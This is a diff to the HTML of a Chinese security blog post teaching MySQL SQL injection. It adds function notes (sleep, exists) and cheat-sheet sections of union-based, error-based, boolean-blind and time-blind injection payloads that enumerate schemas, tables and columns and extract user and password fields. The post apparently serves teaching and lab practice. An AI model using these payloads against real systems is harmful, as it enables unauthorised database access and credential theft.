@@ -27,7 +27,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200911100714531.png">
 <meta property="article:published_time" content="2020-08-22T14:46:26.000Z">
-<meta property="article:modified_time" content="2020-10-26T02:24:28.865Z">
+<meta property="article:modified_time" content="2020-11-10T07:51:52.387Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="OWSP-TOP10">
 <meta name="twitter:card" content="summary">
@@ -184,7 +184,7 @@
   <div class="slimContent">
     <nav id="toc" class="article-toc">
       <h3 class="toc-title">文章目录</h3>
-      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">3.</span> <span class="toc-text">常用函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#right%E3%80%81left%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.</span> <span class="toc-text">right、left函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#isnull-exp"><span class="toc-number">3.2.</span> <span class="toc-text">isnull(exp)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ifnull-expr1-expr2"><span class="toc-number">3.3.</span> <span class="toc-text">ifnull(expr1,expr2)</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%AC%A6%E5%8F%B7"><span class="toc-number">4.</span> <span class="toc-text">常用符号</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%8D%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">4.1.</span> <span class="toc-text">位运算符</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="toc-number">5.</span> <span class="toc-text">注入分类</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">5.1.</span> <span class="toc-text">联合注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">5.2.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Limit%E6%B3%A8%E5%85%A5"><span class="toc-number">5.3.</span> <span class="toc-text">Limit注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">5.4.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">5.5.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">5.6.</span> <span class="toc-text">盲注</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#IF"><span class="toc-number">5.7.</span> <span class="toc-text">IF()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MID"><span class="toc-number">5.8.</span> <span class="toc-text">MID()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ord"><span class="toc-number">5.9.</span> <span class="toc-text">ord()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ELT-N-str1-str2-str3-%E2%80%A6"><span class="toc-number">5.10.</span> <span class="toc-text">ELT(N,str1,str2,str3,…)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">5.11.</span> <span class="toc-text">宽字节注入</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PDO%E6%8A%80%E6%9C%AF"><span class="toc-number">6.</span> <span class="toc-text">PDO技术</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#insert%E3%80%81update%E6%B3%A8%E5%85%A5"><span class="toc-number">6.1.</span> <span class="toc-text">insert、update注入</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">6.1.1.</span> <span class="toc-text">利用报错注入</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8"><span class="toc-number">6.1.2.</span> <span class="toc-text">无回显注入(盲注)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE%E6%B3%A8%E5%85%A5-%E7%AC%A6%E5%8F%B7"><span class="toc-number">6.1.3.</span> <span class="toc-text">有回显注入(符号)</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">6.2.</span> <span class="toc-text">补充</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">3.</span> <span class="toc-text">常用函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#right%E3%80%81left%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.</span> <span class="toc-text">right、left函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#isnull-exp"><span class="toc-number">3.2.</span> <span class="toc-text">isnull(exp)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ifnull-expr1-expr2"><span class="toc-number">3.3.</span> <span class="toc-text">ifnull(expr1,expr2)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#sleep"><span class="toc-number">3.4.</span> <span class="toc-text">sleep()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#exists"><span class="toc-number">3.5.</span> <span class="toc-text">exists()</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%AC%A6%E5%8F%B7"><span class="toc-number">4.</span> <span class="toc-text">常用符号</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%8D%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">4.1.</span> <span class="toc-text">位运算符</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="toc-number">5.</span> <span class="toc-text">注入分类</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">5.1.</span> <span class="toc-text">联合注入</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81payload"><span class="toc-number">5.1.1.</span> <span class="toc-text">常见payload</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">5.2.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8payload"><span class="toc-number">5.2.1.</span> <span class="toc-text">常用payload</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Limit%E6%B3%A8%E5%85%A5"><span class="toc-number">5.3.</span> <span class="toc-text">Limit注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">5.4.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">5.5.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">5.6.</span> <span class="toc-text">盲注</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#IF"><span class="toc-number">5.7.</span> <span class="toc-text">IF()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MID"><span class="toc-number">5.8.</span> <span class="toc-text">MID()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ord"><span class="toc-number">5.9.</span> <span class="toc-text">ord()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ELT-N-str1-str2-str3-%E2%80%A6"><span class="toc-number">5.10.</span> <span class="toc-text">ELT(N,str1,str2,str3,…)</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8payload-1"><span class="toc-number">5.10.1.</span> <span class="toc-text">常用payload</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">5.11.</span> <span class="toc-text">宽字节注入</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PDO%E6%8A%80%E6%9C%AF"><span class="toc-number">6.</span> <span class="toc-text">PDO技术</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#insert%E3%80%81update%E6%B3%A8%E5%85%A5"><span class="toc-number">6.1.</span> <span class="toc-text">insert、update注入</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">6.1.1.</span> <span class="toc-text">利用报错注入</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8"><span class="toc-number">6.1.2.</span> <span class="toc-text">无回显注入(盲注)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE%E6%B3%A8%E5%85%A5-%E7%AC%A6%E5%8F%B7"><span class="toc-number">6.1.3.</span> <span class="toc-text">有回显注入(符号)</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">6.2.</span> <span class="toc-text">补充</span></a></li></ol></li></ol>
     </nav>
   </div>
 </aside>
@@ -270,6 +270,14 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * <span class="keyword">from</span> math where id=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">0</span>,concat(<span class="number">0x7e</span>,isnull(LOAD_FILE(<span class="string">&#x27;/Users/apple/Desktop/2.txt&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">0</span>);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;~1~&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <h5 id="ifnull-expr1-expr2"><a href="#ifnull-expr1-expr2" class="headerlink" title="ifnull(expr1,expr2)"></a>ifnull(expr1,expr2)</h5><p>假如expr1不为NULL，则IFNULL()的返回值为expr1; 否则其返回值为expr2。IFNULL()的返回值是数字或是字符串。</p>
+<h5 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h5><p>延时n秒，执行之后返回0。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select sleep(2);</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">| sleep(2) |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">|        0 |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">2.00</span> sec)</span><br></pre></td></tr></table></figure>
+
+<h5 id="exists"><a href="#exists" class="headerlink" title="exists()"></a>exists()</h5><p>exists子句返回的结果并不是从数据库中取出的结果集，而是一个布尔值，如果子句查询到数据，那么返回true，反之返回false。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exists(select * from math);</span><br><span class="line">+<span class="comment">----------------------------+</span></span><br><span class="line">| exists(<span class="keyword">select</span> * <span class="keyword">from</span> math) |</span><br><span class="line">+<span class="comment">----------------------------+</span></span><br><span class="line">|                          <span class="number">1</span> |</span><br><span class="line">+<span class="comment">----------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
+
+
+
 <h4 id="常用符号"><a href="#常用符号" class="headerlink" title="常用符号"></a>常用符号</h4><h5 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h5><p>二进制数上进行计算的运算符。位运算会先将操作数变成二进制数，进行位运算。然后再将计算结果从二进制数变回十进制数。</p>
 <ul>
 <li><p>按位或</p>
@@ -325,6 +333,27 @@
 <li><p>获取指定数据库的指定数据表的所有的内容</p>
 </li>
 </ul>
+<h6 id="常见payload"><a href="#常见payload" class="headerlink" title="常见payload"></a>常见payload</h6><p>判断字段</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 2<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>判断显示位</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>判断数据库banner信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span><span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select version(),database()#</span></span><br></pre></td></tr></table></figure>
+
+<p>判断数据库名字</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata–+</span><br></pre></td></tr></table></figure>
+
+<p>判断数据库中的表名字</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;security&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>判断数据库中的表的列的名字</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;users&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>判断字段内容</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br></pre></td></tr></table></figure>
+
 <h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><ul>
 <li><p>BIGINT等数据类型溢出</p>
 <ul>
@@ -464,9 +493,14 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。</span><br></pre></td></tr></table></figure>
 
 
-
 </li>
 </ul>
+<h6 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;  and extractvalue(1,concat(0x7e,user(),0x7e))<span class="comment">#</span></span><br><span class="line">-1&#x27;  and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))<span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27;  and updatexml(1,concat(0x7e,user(),0x7e),1)#</span></span><br><span class="line"><span class="string">-1&#x27;</span>  <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27;  and (select 1 from(select count(),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)#</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
 <h5 id="Limit注入"><a href="#Limit注入" class="headerlink" title="Limit注入"></a>Limit注入</h5><ul>
 <li><p>常用函数</p>
 <ul>
@@ -678,6 +712,57 @@
 <p>四个\，其中两个用来转义。<br>DNSlog平台接受信息<br><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200911100714531.png" alt="image-20200911100714531"></p>
 </li>
 </ul>
+<h6 id="常用payload-1"><a href="#常用payload-1" class="headerlink" title="常用payload"></a>常用payload</h6><p>布尔盲注</p>
+<p>判断数据库的类型</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//判断是否是 Mysql数据库</span><br><span class="line">1&#x27; and exists(<span class="keyword">select</span>*<span class="keyword">from</span> information_schema.tables) <span class="comment">#</span></span><br><span class="line">//判断是否是 <span class="keyword">access</span>数据库</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and exists(select*from msysobjects) #</span></span><br><span class="line"><span class="string">//判断是否是 Sqlserver数据库</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span>*<span class="keyword">from</span> sysobjects) <span class="comment">#</span></span><br><span class="line">//判断是否是<span class="keyword">Oracle</span>数据库</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(*) from dual)&gt;0 #</span></span><br></pre></td></tr></table></figure>
+
+<p>判断数据库长度</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and length(database())&gt;5 </span><br></pre></td></tr></table></figure>
+
+<p>判断数据库的名字</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and ascii(substr(database(),1,1))&gt;100</span><br></pre></td></tr></table></figure>
+
+<p>判断数据库中是否存在某个表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and exists(select*from admin)</span><br></pre></td></tr></table></figure>
+
+<p>判断数据库中表的数量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and (select count(table_name) from information_schema.tables where table_schema&#x3D;database())&gt;5 #</span><br></pre></td></tr></table></figure>
+
+<p>判断数据库中表的长度</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&#x3D;6</span><br></pre></td></tr></table></figure>
+
+<p>判断数据库中表的名字</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;100 #</span><br></pre></td></tr></table></figure>
+
+<p>判断数据库中的表中是否存在某个字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and exists(select username from admin)</span><br></pre></td></tr></table></figure>
+
+<p>判断数据库中的表的字段的数量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and (select count(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;)&gt;5 #</span><br></pre></td></tr></table></figure>
+
+<p>判断数据库中表的字段的长度</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and length((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1))&gt;5</span><br></pre></td></tr></table></figure>
+
+<p>判断数据库中表的字段的名字</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),1,1))&gt;100</span><br></pre></td></tr></table></figure>
+
+<p>判断字段中的数据的长度</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and length((select id from users limit 0,1))&gt;5</span><br></pre></td></tr></table></figure>
+
+<p>判断字段中的数据的值</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr((<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">100</span></span><br></pre></td></tr></table></figure>
+
+<p>时间盲注</p>
+<p>判断时间盲注</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and sleep(5)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>判断数据库的长度</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(length(database())=5,1,sleep(5)) <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>判断数据库的名字</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(ascii(substring(database(),1,1))&lt;100,1,sleep(5)) #</span><br></pre></td></tr></table></figure>
+
+<p>同理数据库的表、字段、值。</p>
 <h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5><p>造成宽字节注入的原因是编码转换，应用程序的编码与数据库的编码不一致，编码转换导致的引号逃逸。</p>
 <p>GBK双字节编码：一个汉字用两个字节表示，首字节对应0x81-0xFE，尾字节对应0x40-0xFE（除0x7F），刚好涵盖了对应的编码0x5C。</p>
 <p>比如客户端php的编码为UTF-8，而mysql通过set name ‘GBK’设置编码，导致两者的编码不一样，在进行编码转换的时候出现了宽字节注入。</p>
